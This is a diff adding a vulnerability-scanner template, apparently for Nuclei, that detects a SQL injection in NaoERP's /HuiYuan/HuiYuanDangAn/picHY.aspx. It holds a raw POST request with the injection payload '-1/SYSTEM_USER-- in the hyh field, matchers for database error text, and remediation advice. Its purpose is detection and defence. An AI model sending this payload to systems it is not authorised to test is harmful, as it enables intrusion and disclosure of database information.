@@ -1,0 +1,55 @@
+id: naoerp-pichy-sqli
+
+info:
+  name: NaoERP /HuiYuan/HuiYuanDangAn/picHY.aspx - SQL Injection
+  author: iSee857
+  severity: high
+  description: |
+    NaoERP is affected by a SQL injection vulnerability in /HuiYuan/HuiYuanDangAn/picHY.aspx.
+    The hyh parameter is not properly sanitized and may be used to trigger database error responses,
+    potentially allowing attackers to extract sensitive information from the backend database.
+  remediation: |
+    - Apply the vendor security patch or upgrade to a fixed version as soon as possible.
+    - Use parameterized queries (prepared statements) for all user-controlled parameters, especially hyh.
+    - Enforce strict input validation and reject malformed or unexpected input values.
+    - Restrict access to the affected endpoint to trusted internal networks and authenticated users only.
+    - Monitor logs for repeated database error probes and block suspicious sources.
+  impact: |
+    Successful exploitation may allow attackers to disclose sensitive database information,
+    enumerate backend database details, and potentially manipulate application data.
+  reference: []
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: naoerp
+    product: naoerp-erp
+    verified: true
+    max-request: 1
+  tags: 九佳易管理系统
+
+http:
+  - raw:
+      - |
+        POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="hyh"
+
+        '-1/SYSTEM_USER--
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'nvarchar'
+          - '数据类型'
+        condition: and
+
+      - type: status
+        status:
+          - 500
